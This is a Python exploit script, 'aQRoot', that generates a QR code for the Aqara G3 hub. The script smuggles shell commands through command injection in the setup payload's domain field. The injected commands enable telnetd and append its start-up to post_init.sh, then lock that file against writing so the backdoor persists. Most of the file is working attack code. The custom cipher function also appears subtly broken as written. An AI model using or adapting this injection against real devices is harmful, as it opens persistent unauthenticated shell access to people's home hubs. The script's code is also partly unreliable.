#!/usr/bin/env python3
import argparse
import segno

__title__ = "aQRoot"
__desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
__version__ = "0.1"
__author__ = "Gareth Bryan"
__license__ = "MIT"

iArr = [[-128, -48, 33, 164], [-47, 32, 34, 84], [33, 35, -1, 0], [127, 127, 35, -91]]


def cipher(data):
    out = ""
    for c in data:
        for j in iArr:
            if j[0] > c or j[1] < c:
                continue
            _ = (j[2] if j[2] != -1 else c) + j[3] + data
            out += chr((0xFF00 & _) >> 8)
            out += chr(_ & 0xFF)
        else:
            out += chr(0xA2 - c)
    return out


def generate_payload(ssid, pwd, domain="aiot-coap.aqara.cn"):
    """
    Here be dragons
    nslookup sprintf buffer is [132] (i.e do not exceed 132 on key d)
    """
    payload = {
        "b": f"lumiLZc1dhEfPzMN",
        "d": ";".join(
            [
                domain,
                'x="fw_""manager.sh"',  	# Workaround - Script checks if it's already running by grepping ps.
                "$x -t -k",  			# Enable tty and telnetd
                "$x -t -f",  			# Create default /data/scripts/post_init.sh
                "y=/data/scripts/post_init.sh",
                'echo "$x -t -k" >> $y',  	# Append tty enable and telnetd start to post_init script
                "chmod 555 $y",  		# Remove write access to post_init script
            ]
        ),
        "x": cipher(ssid.encode()),
        "y": cipher(pwd.encode()),
        "l": "en",
    }
    return "&".join([f"{k}={v}" for k, v in payload.items()])


def gen_qrcode(data, outfile=None):
    qrcode = segno.make(data, error="h")
    qrcode.terminal(compact=True, border=10)
    if outfile:
        qrcode.save(outfile, border=10, scale=8)


def main(args):
    data = generate_payload(
        ssid=args.ssid,
        pwd=args.pwd,
    )
    gen_qrcode(data, args.filename)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="{} v{}\n{}".format(__title__, __version__, __desc__),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "ssid",
        help="Wireless SSID",
    )
    parser.add_argument("pwd", help="Wireless Password")
    parser.add_argument(
        "filename",
        nargs="?",
        type=argparse.FileType("wb"),
        help="(Optional) Save QR Code as image",
    )
    args = parser.parse_args()
    main(args)

